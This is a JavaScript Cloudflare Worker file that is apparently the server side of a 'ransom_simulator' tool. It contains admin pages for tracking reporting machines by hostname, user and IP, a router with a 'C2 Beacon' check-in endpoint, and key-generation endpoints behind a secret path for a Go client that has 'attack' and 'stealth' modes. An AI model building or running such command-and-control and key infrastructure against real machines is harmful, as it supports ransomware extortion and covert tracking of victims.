function getAdminSettingsPage(view, message, error) {
    const adminSourceText = view.adminSource === 'custom'
        ? '当前使用后台设置的登录密钥'
        : (view.adminSource === 'env' ? '当前使用环境变量 ADMIN_TOKEN' : '尚未配置登录密钥');
    const messageHtml = message
        ? `<div class="mb-5 border border-emerald-200 bg-emerald-50 text-emerald-700 text-sm rounded-lg px-4 py-3">${escapeHtmlText(message)}</div>`
        : '';
    const errorHtml = error
        ? `<div class="mb-5 border border-red-200 bg-red-50 text-red-700 text-sm rounded-lg px-4 py-3">${escapeHtmlText(error)}</div>`
        : '';
    const heartbeatStatus = view.heartbeatConfigured ? '已启用（客户端需带 X-Heartbeat-Token）' : '未启用（接收所有心跳）';
    const turnstileSiteSourceText = view.turnstileSiteSource === 'db'
        ? '后台设置'
        : (view.turnstileSiteSource === 'env' ? '环境变量 TURNSTILE_SITE_KEY' : '未配置');
    const turnstileSecretSourceText = view.turnstileSecretSource === 'db'
        ? '后台设置'
        : (view.turnstileSecretSource === 'env' ? '环境变量 TURNSTILE_SECRET_KEY' : '未配置');
    const turnstileStatus = view.turnstileConfigured
        ? '当前生效 — Site Key：' + turnstileSiteSourceText
            + (view.turnstileSiteKey ? '（' + view.turnstileSiteKey + '）' : '')
            + '；Secret Key：' + turnstileSecretSourceText
            + '。网页生成密钥时会按 Secret Key 校验。'
        : '未配置（网页生成密钥不校验人机验证）';
    const secretPlaceholder = escapeHtmlText(view.effectiveSecretPath);

    return `<!DOCTYPE html>
<html lang="zh-CN" class="scroll-smooth">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>系统设置</title>
    <link rel="icon" href="https://s3.yangzifun.org/logo.ico" type="image/x-icon">
    <script src="https://cdn.tailwindcss.com"></script>
    <script src="https://unpkg.com/lucide@latest"></script>
    <style>body { font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; }</style>
</head>
<body class="bg-white min-h-screen text-gray-700">
    <div class="min-h-screen flex flex-col items-center py-8 px-4 sm:px-6 lg:px-8">
        <div class="w-full max-w-4xl">
            <div class="flex flex-wrap items-center justify-between gap-4 mb-8">
                <div class="flex items-center">
                    <i data-lucide="settings" class="w-8 h-8 mr-3 text-gray-600"></i>
                    <div>
                        <h1 class="text-2xl font-bold text-gray-700">系统设置</h1>
                        <p class="text-sm text-gray-500 mt-1">保存后立即生效；留空表示保持当前值</p>
                    </div>
                </div>
                <div class="flex items-center gap-3">
                    <a href="/admin" class="inline-flex items-center px-4 py-2 text-sm border border-gray-300 rounded-lg text-gray-600 hover:bg-gray-50">
                        <i data-lucide="monitor-check" class="w-4 h-4 mr-2"></i>终端管理
                    </a>
                    <form method="post" action="/admin/logout">
                        <button type="submit" class="inline-flex items-center px-4 py-2 text-sm bg-gray-700 text-white rounded-lg hover:bg-gray-800">
                            <i data-lucide="log-out" class="w-4 h-4 mr-2"></i>退出
                        </button>
                    </form>
                </div>
            </div>

            ${messageHtml}${errorHtml}

            <form method="post" action="/admin/settings" class="space-y-6">
                <!-- 登录密钥 -->
                <section class="border border-gray-200 rounded-xl p-6">
                    <div class="flex items-center mb-1">
                        <i data-lucide="key-round" class="w-5 h-5 mr-2 text-gray-600"></i>
                        <h2 class="text-lg font-semibold text-gray-700">管理登录密钥</h2>
                    </div>
                    <p class="text-sm text-gray-500 mb-4">${escapeHtmlText(adminSourceText)}；修改后所有已登录会话立即失效，需用新密钥重新登录。</p>
                    <div class="grid grid-cols-1 sm:grid-cols-2 gap-4">
                        <div>
                            <label class="block text-sm font-medium text-gray-600 mb-1" for="admin_token">新登录密钥</label>
                            <input id="admin_token" name="admin_token" type="password" autocomplete="new-password" minlength="8" maxlength="128"
                                   class="w-full px-3 py-2 border-2 border-gray-300 rounded-lg font-mono" placeholder="留空保持不变">
                        </div>
                        <div>
                            <label class="block text-sm font-medium text-gray-600 mb-1" for="admin_token_confirm">确认新登录密钥</label>
                            <input id="admin_token_confirm" name="admin_token_confirm" type="password" autocomplete="new-password" minlength="8" maxlength="128"
                                   class="w-full px-3 py-2 border-2 border-gray-300 rounded-lg font-mono" placeholder="再次输入">
                        </div>
                    </div>
                    <label class="flex items-center gap-2 mt-4 text-sm text-gray-600">
                        <input type="checkbox" name="reset_admin_token" value="1" class="w-4 h-4">
                        清除自定义登录密钥，回退到环境变量 ADMIN_TOKEN
                    </label>
                </section>

                <!-- 密钥接口路径 -->
                <section class="border border-gray-200 rounded-xl p-6">
                    <div class="flex items-center mb-1">
                        <i data-lucide="route" class="w-5 h-5 mr-2 text-gray-600"></i>
                        <h2 class="text-lg font-semibold text-gray-700">密钥接口安全路径</h2>
                    </div>
                    <p class="text-sm text-gray-500 mb-4">当前生效：<code class="font-mono">/${secretPlaceholder}</code>。
                        修改后客户端硬编码的 apiURL 需要同步更新，否则无法获取密钥。</p>
                    <div class="flex flex-wrap items-center gap-4">
                        <input name="secret_path" type="text" maxlength="64" pattern="[A-Za-z0-9_-]+"
                               class="flex-1 min-w-[240px] px-3 py-2 border-2 border-gray-300 rounded-lg font-mono"
                               placeholder="留空保持不变，例如 ${secretPlaceholder}">
                        <label class="flex items-center gap-2 text-sm text-gray-600">
                            <input type="checkbox" name="clear_secret_path" value="1" class="w-4 h-4">
                            清除设置（回退环境变量/默认值）
                        </label>
                    </div>
                </section>

                <!-- 心跳密钥 -->
                <section class="border border-gray-200 rounded-xl p-6">
                    <div class="flex items-center mb-1">
                        <i data-lucide="heart-pulse" class="w-5 h-5 mr-2 text-gray-600"></i>
                        <h2 class="text-lg font-semibold text-gray-700">心跳接收密钥</h2>
                    </div>
                    <p class="text-sm text-gray-500 mb-4">${escapeHtmlText(heartbeatStatus)}。</p>
                    <div class="flex flex-wrap items-center gap-4">
                        <input name="heartbeat_token" type="password" maxlength="128"
                               class="flex-1 min-w-[240px] px-3 py-2 border-2 border-gray-300 rounded-lg font-mono"
                               placeholder="设置后客户端需配置 -heartbeat-token；留空保持不变">
                        <label class="flex items-center gap-2 text-sm text-gray-600">
                            <input type="checkbox" name="clear_heartbeat_token" value="1" class="w-4 h-4">
                            清除该密钥（不再校验）
                        </label>
                    </div>
                </section>

                <!-- Turnstile -->
                <section class="border border-gray-200 rounded-xl p-6">
                    <div class="flex items-center mb-1">
                        <i data-lucide="shield-check" class="w-5 h-5 mr-2 text-gray-600"></i>
                        <h2 class="text-lg font-semibold text-gray-700">Turnstile 人机验证</h2>
                    </div>
                    <p class="text-sm text-gray-500 mb-4">${escapeHtmlText(turnstileStatus)}</p>
                    <p class="text-xs text-gray-400 mb-4">未填写的项继续使用 Cloudflare 环境变量；这里保存后会覆盖环境变量，勾选“清除”则回退到环境变量。</p>
                    <div class="grid grid-cols-1 sm:grid-cols-2 gap-4">
                        <div>
                            <label class="block text-sm font-medium text-gray-600 mb-1" for="turnstile_site_key">Site Key</label>
                            <input id="turnstile_site_key" name="turnstile_site_key" type="text" maxlength="128"
                                   class="w-full px-3 py-2 border-2 border-gray-300 rounded-lg font-mono" placeholder="留空保持不变${view.turnstileSiteKey ? '（当前：' + escapeHtmlText(view.turnstileSiteKey) + '）' : ''}">
                        </div>
                        <div>
                            <label class="block text-sm font-medium text-gray-600 mb-1" for="turnstile_secret_key">Secret Key</label>
                            <input id="turnstile_secret_key" name="turnstile_secret_key" type="password" maxlength="128"
                                   class="w-full px-3 py-2 border-2 border-gray-300 rounded-lg font-mono" placeholder="留空保持不变">
                        </div>
                    </div>
                    <label class="flex items-center gap-2 mt-4 text-sm text-gray-600">
                        <input type="checkbox" name="clear_turnstile" value="1" class="w-4 h-4">
                        清除 Turnstile 配置
                    </label>
                </section>

                <div class="flex justify-end gap-3">
                    <a href="/admin" class="px-4 py-2.5 text-sm border border-gray-300 rounded-lg text-gray-600 hover:bg-gray-50">取消</a>
                    <button type="submit" class="px-5 py-2.5 text-sm bg-gray-700 text-white rounded-lg hover:bg-gray-800">保存设置</button>
                </div>
            </form>

            <div class="mt-10 text-center text-gray-500 text-sm">
                <p>Powered by <a href="https://www.yangzihome.space" class="text-gray-600 hover:text-gray-800">YZFN</a> | <a href="/admin" class="text-gray-600 hover:text-gray-800">终端管理</a></p>
            </div>
        </div>
    </div>
    <script>lucide.createIcons();</script>
</body>
</html>`;
}

// -----------------------------------------------------------------------------------
// 管理后台页面
// -----------------------------------------------------------------------------------
function getAdminNotConfiguredPage() {
    return `<!DOCTYPE html>
<html lang="zh-CN">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>终端管理 - 未配置</title>
    <link rel="icon" href="https://s3.yangzifun.org/logo.ico" type="image/x-icon">
    <script src="https://cdn.tailwindcss.com"></script>
</head>
<body class="bg-white min-h-screen text-gray-700">
    <div class="min-h-screen flex items-center justify-center px-4">
        <div class="max-w-xl w-full border-2 border-yellow-300 bg-yellow-50 rounded-2xl p-8">
            <h1 class="text-2xl font-bold text-yellow-800 mb-4">终端管理后台未启用</h1>
            <p class="text-yellow-800 mb-4">Worker 尚未配置管理令牌 <code class="font-mono bg-white px-1.5 py-0.5 rounded">ADMIN_TOKEN</code>。</p>
            <p class="text-sm text-yellow-700 mb-2">请执行以下命令后重新访问：</p>
            <pre class="bg-gray-900 text-green-400 text-sm rounded-lg p-4 overflow-x-auto">wrangler secret put ADMIN_TOKEN</pre>
            <p class="text-sm text-yellow-700 mt-4">该令牌用于登录 <code class="font-mono">/admin</code> 管理后台，也可通过 <code class="font-mono">Authorization: Bearer &lt;token&gt;</code> 调用管理接口。</p>
            <div class="mt-6"><a href="/" class="text-gray-600 underline">返回首页</a></div>
        </div>
    </div>
</body>
</html>`;
}

function getAdminLoginPage(errorMessage, noticeMessage) {
    const errorHtml = errorMessage
        ? `<div class="mb-5 border border-red-200 bg-red-50 text-red-700 text-sm rounded-lg px-4 py-3">${escapeHtmlText(errorMessage)}</div>`
        : '';
    const noticeHtml = noticeMessage
        ? `<div class="mb-5 border border-emerald-200 bg-emerald-50 text-emerald-700 text-sm rounded-lg px-4 py-3">${escapeHtmlText(noticeMessage)}</div>`
        : '';
    return `<!DOCTYPE html>
<html lang="zh-CN">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>终端管理 - 登录</title>
    <link rel="icon" href="https://s3.yangzifun.org/logo.ico" type="image/x-icon">
    <script src="https://cdn.tailwindcss.com"></script>
    <script src="https://unpkg.com/lucide@latest"></script>
</head>
<body class="bg-white min-h-screen text-gray-700">
    <div class="min-h-screen flex items-center justify-center px-4">
        <div class="max-w-md w-full border border-gray-200 rounded-2xl p-8 shadow-sm">
            <div class="flex items-center mb-6">
                <i data-lucide="monitor-check" class="w-8 h-8 mr-3 text-gray-600"></i>
                <h1 class="text-2xl font-bold text-gray-700">终端在线管理</h1>
            </div>
            ${errorHtml}${noticeHtml}
            <form method="post" action="/admin/login" class="space-y-4">
                <div>
                    <label for="token" class="block text-sm font-medium text-gray-600 mb-2">管理令牌</label>
                    <input id="token" name="token" type="password" autocomplete="current-password" required
                           class="w-full px-4 py-2.5 border-2 border-gray-300 rounded-lg focus:outline-none focus:border-gray-500 font-mono"
                           placeholder="ADMIN_TOKEN">
                </div>
                <button type="submit" class="w-full px-4 py-2.5 bg-gray-700 text-white rounded-lg hover:bg-gray-800 transition-colors">
                    登录
                </button>
            </form>
            <div class="text-center mt-6">
                <a href="/" class="text-sm text-gray-500 hover:text-gray-700">返回首页</a>
            </div>
        </div>
    </div>
    <script>lucide.createIcons();</script>
</body>
</html>`;
}

const ADMIN_CLIENT_SCRIPT = `
    const REFRESH_MS = 10000;
    let autoRefresh = true;
    let refreshTimer = null;
    let latest = { terminals: [], summary: { online: 0, offline: 0, total: 0 } };

    function escapeHtml(text) {
        return String(text === null || text === undefined ? '' : text).replace(/[&<>"']/g, function (ch) {
            return { '&': '&amp;', '<': '&lt;', '>': '&gt;', '"': '&quot;', "'": '&#39;' }[ch];
        });
    }

    function formatAgo(seconds) {
        const s = Math.max(0, Math.floor(seconds || 0));
        if (s < 5) return '刚刚';
        if (s < 60) return s + ' 秒前';
        if (s < 3600) return Math.floor(s / 60) + ' 分钟前';
        if (s < 86400) return Math.floor(s / 3600) + ' 小时前';
        return Math.floor(s / 86400) + ' 天前';
    }

    function formatTime(ts) {
        if (!ts) return '-';
        const d = new Date(ts * 1000);
        const pad = function (n) { return String(n).padStart(2, '0'); };
        return d.getFullYear() + '-' + pad(d.getMonth() + 1) + '-' + pad(d.getDate()) + ' ' +
            pad(d.getHours()) + ':' + pad(d.getMinutes()) + ':' + pad(d.getSeconds());
    }

    function statusBadge(online) {
        if (online) {
            return '<span class="inline-flex items-center gap-1.5 px-2.5 py-1 rounded-full text-xs font-medium bg-emerald-50 text-emerald-700 border border-emerald-200">' +
                '<span class="w-1.5 h-1.5 rounded-full bg-emerald-500"></span>在线</span>';
        }
        return '<span class="inline-flex items-center gap-1.5 px-2.5 py-1 rounded-full text-xs font-medium bg-gray-100 text-gray-500 border border-gray-200">' +
            '<span class="w-1.5 h-1.5 rounded-full bg-gray-400"></span>离线</span>';
    }

    function modeLabel(mode) {
        const map = { 'dry-run': '演习', 'attack': '实战', 'remote': '远程编排', 'stealth': '隐身' };
        const key = String(mode || '').toLowerCase();
        return map[key] || (mode || '-');
    }

    function rowHtml(t) {
        const host = escapeHtml(t.hostname || '未知主机');
        const idShort = escapeHtml(String(t.id || '').slice(0, 8));
        const user = escapeHtml(t.username || '-');
        const osText = escapeHtml((t.os || '-') + (t.arch ? ' / ' + t.arch : ''));
        const verText = escapeHtml(t.version || '-');
        const modeText = escapeHtml(modeLabel(t.mode));
        const ipText = escapeHtml(t.ip || '-');
        const countryText = escapeHtml(t.country || '');
        const ago = escapeHtml(formatAgo(t.seconds_since_last_seen));
        const lastTime = escapeHtml(formatTime(t.last_seen));
        const firstTime = escapeHtml(formatTime(t.first_seen));
        const removeId = escapeHtml(t.id || '');
        const removeHost = escapeHtml(t.hostname || t.id || '');
        const rowClass = t.online ? '' : 'opacity-70';
        return '<tr class="border-b border-gray-100 hover:bg-gray-50 ' + rowClass + '">' +
            '<td class="px-4 py-3 whitespace-nowrap">' + statusBadge(t.online) + '</td>' +
            '<td class="px-4 py-3"><div class="font-medium text-gray-700">' + host + '</div>' +
                '<div class="text-xs text-gray-400 font-mono" title="' + escapeHtml(t.id || '') + '">' + idShort + '</div></td>' +
            '<td class="px-4 py-3 whitespace-nowrap">' + user + '</td>' +
            '<td class="px-4 py-3 whitespace-nowrap">' + osText + '</td>' +
            '<td class="px-4 py-3 whitespace-nowrap"><div>' + verText + '</div><div class="text-xs text-gray-400">' + modeText + '</div></td>' +
            '<td class="px-4 py-3 whitespace-nowrap"><div>' + ipText + '</div><div class="text-xs text-gray-400">' + countryText + '</div></td>' +
            '<td class="px-4 py-3 whitespace-nowrap"><div>' + ago + '</div><div class="text-xs text-gray-400" title="首次上线 ' + firstTime + '">' + lastTime + '</div></td>' +
            '<td class="px-4 py-3 text-right whitespace-nowrap">' + (t.heartbeat_count || 0) + '</td>' +
            '<td class="px-4 py-3 text-right whitespace-nowrap">' +
                '<button data-remove-id="' + removeId + '" data-remove-host="' + removeHost + '" class="text-xs text-red-500 hover:text-red-700 border border-red-200 rounded px-2 py-1">移除</button>' +
            '</td></tr>';
    }

    function render() {
        const summary = latest.summary || { online: 0, offline: 0, total: 0 };
        document.getElementById('stat-online').textContent = summary.online;
        document.getElementById('stat-offline').textContent = summary.offline;
        document.getElementById('stat-total').textContent = summary.total;

        const keyword = (document.getElementById('searchInput').value || '').trim().toLowerCase();
        const list = (latest.terminals || []).filter(function (t) {
            if (!keyword) return true;
            return [t.hostname, t.username, t.id, t.ip, t.os, t.mode].join(' ').toLowerCase().indexOf(keyword) >= 0;
        });

        const tbody = document.getElementById('terminalRows');
        if (!list.length) {
            tbody.innerHTML = '<tr><td colspan="9" class="px-4 py-12 text-center text-gray-400">' +
                ((latest.terminals || []).length ? '没有匹配的终端' : '暂无终端上报，等待客户端心跳...') + '</td></tr>';
            return;
        }
        tbody.innerHTML = list.map(rowHtml).join('');
        lucide.createIcons();
    }

    async function loadTerminals() {
        try {
            const res = await fetch('/admin/api/terminals', { credentials: 'same-origin', cache: 'no-store' });
            if (res.status === 401) { window.location.href = '/admin'; return; }
            const data = await res.json();
            if (data.status !== 'success') throw new Error(data.message || '加载失败');
            latest = data;
            render();
            document.getElementById('last-update').textContent = '更新于 ' + formatTime(data.server_time);
        } catch (e) {
            document.getElementById('last-update').textContent = '加载失败: ' + e.message;
        }
    }

    async function removeTerminal(id, host) {
        if (!window.confirm('确定移除终端 ' + host + ' 吗？移除后需重新心跳才会再次出现。')) return;
        try {
            const res = await fetch('/admin/api/terminals/delete', {
                method: 'POST',
                credentials: 'same-origin',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ id: id })
            });
            if (res.status === 401) { window.location.href = '/admin'; return; }
            const data = await res.json();
            if (data.status !== 'success') throw new Error(data.message || '删除失败');
            loadTerminals();
        } catch (e) {
            window.alert('移除失败: ' + e.message);
        }
    }

    function scheduleRefresh() {
        if (refreshTimer) { clearInterval(refreshTimer); refreshTimer = null; }
        if (autoRefresh) refreshTimer = setInterval(loadTerminals, REFRESH_MS);
    }

    document.addEventListener('DOMContentLoaded', function () {
        lucide.createIcons();
        document.getElementById('searchInput').addEventListener('input', render);
        document.getElementById('autoRefresh').addEventListener('change', function (e) {
            autoRefresh = !!e.target.checked;
            scheduleRefresh();
        });
        document.getElementById('refreshBtn').addEventListener('click', loadTerminals);
        document.getElementById('terminalRows').addEventListener('click', function (e) {
            const btn = e.target.closest('button[data-remove-id]');
            if (!btn) return;
            removeTerminal(btn.getAttribute('data-remove-id'), btn.getAttribute('data-remove-host'));
        });
        loadTerminals();
        scheduleRefresh();
    });
`;

function getAdminPageHtml() {
    return `<!DOCTYPE html>
<html lang="zh-CN" class="scroll-smooth">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>终端在线管理</title>
    <link rel="icon" href="https://s3.yangzifun.org/logo.ico" type="image/x-icon">
    <script src="https://cdn.tailwindcss.com"></script>
    <script src="https://unpkg.com/lucide@latest"></script>
    <script>
      tailwind.config = {
        theme: { extend: { fontFamily: { 'sans': ['-apple-system', 'BlinkMacSystemFont', '"Segoe UI"', 'Roboto', 'sans-serif'], 'mono': ['SF Mono', 'Courier New', 'monospace'] } } }
      }
    </script>
    <style>
      body { font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; }
    </style>
</head>
<body class="bg-white min-h-screen text-gray-700">
    <div class="min-h-screen flex flex-col items-center py-8 px-4 sm:px-6 lg:px-8">
        <div class="w-full max-w-7xl">
            <div class="flex flex-wrap items-center justify-between gap-4 mb-8">
                <div class="flex items-center">
                    <i data-lucide="monitor-check" class="w-9 h-9 mr-3 text-gray-600"></i>
                    <div>
                        <h1 class="text-2xl sm:text-3xl font-bold text-gray-700">终端在线管理</h1>
                        <p class="text-sm text-gray-500 mt-1">客户端每 30 秒上报一次心跳 · 超过 90 秒未上报判定为离线</p>
                    </div>
                </div>
                <div class="flex items-center gap-3">
                    <a href="/" class="inline-flex items-center px-4 py-2 text-sm border border-gray-300 rounded-lg text-gray-600 hover:bg-gray-50">
                        <i data-lucide="arrow-left" class="w-4 h-4 mr-2"></i>密钥中心
                    </a>
                    <a href="/admin/settings" class="inline-flex items-center px-4 py-2 text-sm border border-gray-300 rounded-lg text-gray-600 hover:bg-gray-50">
                        <i data-lucide="settings" class="w-4 h-4 mr-2"></i>系统设置
                    </a>
                    <form method="post" action="/admin/logout">
                        <button type="submit" class="inline-flex items-center px-4 py-2 text-sm bg-gray-700 text-white rounded-lg hover:bg-gray-800">
                            <i data-lucide="log-out" class="w-4 h-4 mr-2"></i>退出
                        </button>
                    </form>
                </div>
            </div>

            <div class="grid grid-cols-1 sm:grid-cols-3 gap-4 mb-6">
                <div class="border border-emerald-200 bg-emerald-50 rounded-xl p-5">
                    <div class="text-xs uppercase tracking-wider text-emerald-700 mb-1">在线终端</div>
                    <div id="stat-online" class="text-4xl font-bold text-emerald-600">-</div>
                </div>
                <div class="border border-gray-200 bg-gray-50 rounded-xl p-5">
                    <div class="text-xs uppercase tracking-wider text-gray-500 mb-1">离线终端</div>
                    <div id="stat-offline" class="text-4xl font-bold text-gray-500">-</div>
                </div>
                <div class="border border-gray-200 bg-white rounded-xl p-5">
                    <div class="text-xs uppercase tracking-wider text-gray-500 mb-1">终端总数</div>
                    <div id="stat-total" class="text-4xl font-bold text-gray-700">-</div>
                </div>
            </div>

            <div class="border border-gray-200 rounded-xl p-4 mb-4">
                <div class="flex flex-wrap items-center justify-between gap-3">
                    <div class="flex items-center flex-1 min-w-[220px] border border-gray-300 rounded-lg px-3 py-2">
                        <i data-lucide="search" class="w-4 h-4 text-gray-400 mr-2 flex-shrink-0"></i>
                        <input id="searchInput" type="text" placeholder="搜索主机名 / 用户 / IP / 终端 ID"
                               class="w-full text-sm focus:outline-none">
                    </div>
                    <div class="flex items-center gap-4">
                        <label class="flex items-center gap-2 text-sm text-gray-600 select-none">
                            <input id="autoRefresh" type="checkbox" checked class="w-4 h-4">
                            自动刷新 (10s)
                        </label>
                        <span id="last-update" class="text-xs text-gray-500">尚未加载</span>
                        <button id="refreshBtn" class="inline-flex items-center px-3 py-2 text-sm border border-gray-300 rounded-lg text-gray-600 hover:bg-gray-50">
                            <i data-lucide="refresh-cw" class="w-4 h-4 mr-2"></i>刷新
                        </button>
                    </div>
                </div>
            </div>

            <div class="border border-gray-200 rounded-xl overflow-hidden">
                <div class="overflow-x-auto">
                    <table class="w-full text-sm">
                        <thead class="bg-gray-50 text-gray-500">
                            <tr>
                                <th class="text-left px-4 py-3 font-medium">状态</th>
                                <th class="text-left px-4 py-3 font-medium">主机 / 终端 ID</th>
                                <th class="text-left px-4 py-3 font-medium">用户</th>
                                <th class="text-left px-4 py-3 font-medium">系统</th>
                                <th class="text-left px-4 py-3 font-medium">版本 / 模式</th>
                                <th class="text-left px-4 py-3 font-medium">IP / 地区</th>
                                <th class="text-left px-4 py-3 font-medium">最后心跳</th>
                                <th class="text-right px-4 py-3 font-medium">心跳数</th>
                                <th class="text-right px-4 py-3 font-medium">操作</th>
                            </tr>
                        </thead>
                        <tbody id="terminalRows" class="bg-white">
                            <tr><td colspan="9" class="px-4 py-12 text-center text-gray-400">正在加载...</td></tr>
                        </tbody>
                    </table>
                </div>
            </div>

            <div class="mt-10 text-center text-gray-500 text-sm">
                <p>Powered by <a href="https://www.yangzihome.space" class="text-gray-600 hover:text-gray-800">YZFN</a> | <a href="/" class="text-gray-600 hover:text-gray-800">ransom_simulator</a></p>
            </div>
        </div>
    </div>
    <script>${ADMIN_CLIENT_SCRIPT}</script>
</body>
</html>`;
}

// ===================================================================================
// 主入口
// ===================================================================================

async function handleRequest(request, env, ctx) {
        const url = new URL(request.url);

        // --- 终端心跳上报（Go 客户端每 30s 调用，无需认证）---
        if (url.pathname === '/api/heartbeat') {
            if (request.method !== 'POST') {
                return jsonResponse({ status: 'error', message: 'Method Not Allowed' }, 405);
            }
            return handleTerminalHeartbeat(request, env);
        }

        // --- 管理后台动作（会话 / 令牌鉴权）---
        if (request.method === 'POST' && url.pathname === '/admin/login') {
            return handleAdminLogin(request, env);
        }
        if (request.method === 'POST' && url.pathname === '/admin/logout') {
            return handleAdminLogout(request, env);
        }
        if (request.method === 'POST' && url.pathname === '/admin/settings') {
            return handleAdminSettingsSave(request, env);
        }
        if (request.method === 'POST' && url.pathname === '/admin/api/terminals/delete') {
            return handleAdminDeleteTerminal(request, env);
        }

        // --- C2 Beacon 端点（兼容旧版客户端）---
        if (url.pathname === '/beacon_check_in') {
            const clientIp = request.headers.get('CF-Connecting-IP');
            const userAgent = request.headers.get('User-Agent');
            const timestamp = new Date().toISOString();

            const beaconData = {
                message: "C2 Beacon Received",
                timestamp: timestamp,
                source_ip: clientIp,
                user_agent: userAgent,
                url: request.url,
                method: request.method,
            };

            console.log(JSON.stringify(beaconData));

            return new Response(JSON.stringify({ status: 'ok', message: 'Beacon acknowledged' }), {
                headers: { 'Content-Type': 'application/json' },
            });
        }

        // POST 请求 → 安全路径或 /api/generate 均可访问密钥生成接口
        if (request.method === 'POST') {
            const requestPath = url.pathname.replace(/\/+$/, '') || '/';

            // /api/generate 路径：无需安全校验，直接允许
            if (requestPath === '/api/generate') {
                return handleKeyGeneration(request, env);
            }

            // 安全路径（如 /E56dSY）：无需人机验证，供 Go 程序直接调用
            const secretPath = await resolveSecretPath(env);
            const expectedPath = '/' + secretPath;
            if (requestPath === expectedPath) {
                return handleKeyGenerationSecure(request, env);
            }

            return new Response(JSON.stringify({ status: "error", message: "Not Found" }), {
                headers: { 'Content-Type': 'application/json' },
                status: 404
            });
        }

        // GET 请求 → 路由分发
        if (request.method !== 'GET') {
            return Response.json({ status: "error", message: "Method Not Allowed" }, { status: 405 });
        }

        switch (url.pathname) {
            case '/':
                return new Response(await getHtmlPage(env), {
                    headers: { 'Content-Type': 'text/html;charset=UTF-8' },
                });
            case '/admin':
                return handleAdminPage(request, env);
            case '/admin/settings':
                return handleAdminSettingsPage(request, env);
            case '/admin/api/terminals':
                return handleAdminTerminals(request, env);
            case '/docs':
                return new Response(getDocsPage(), {
                    headers: { 'Content-Type': 'text/html;charset=UTF-8' },
                });
            case '/decrypt':
                return new Response(getDecryptPage(), {
                    headers: { 'Content-Type': 'text/html;charset=UTF-8' },
                });
            case '/query':
                return handleApiQuery(request, env);
            case '/stats':
                return handleApiStats(env, request);
            default:
                return new Response("404 Not Found", { status: 404 });
        }
}

function getWorkerErrorPage() {
    return `<!DOCTYPE html>
<html lang="zh-CN">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>服务暂时不可用</title>
    <script src="https://cdn.tailwindcss.com"></script>
</head>
<body class="bg-white min-h-screen text-gray-700">
    <div class="min-h-screen flex items-center justify-center px-4">
        <div class="max-w-lg w-full border border-red-200 bg-red-50 rounded-2xl p-8 text-center">
            <h1 class="text-2xl font-bold text-red-700 mb-3">服务暂时不可用</h1>
            <p class="text-red-700 mb-4">Worker 处理请求时发生异常，已记录到 Workers Logs。</p>
            <p class="text-sm text-gray-600">请稍后重试；若持续出现，请在 Cloudflare 控制台查看该请求的日志与 Ray ID。</p>
            <div class="mt-6"><a href="/" class="text-gray-600 underline">返回首页</a></div>
        </div>
    </div>
</body>
</html>`;
}

export default {
    async fetch(request, env, ctx) {
        try {
            return await handleRequest(request, env, ctx);
        } catch (e) {
            console.error('Unhandled worker error:', e && e.stack ? e.stack : e);
            return new Response(getWorkerErrorPage(), { status: 500, headers: HTML_HEADERS });
        }
    },
};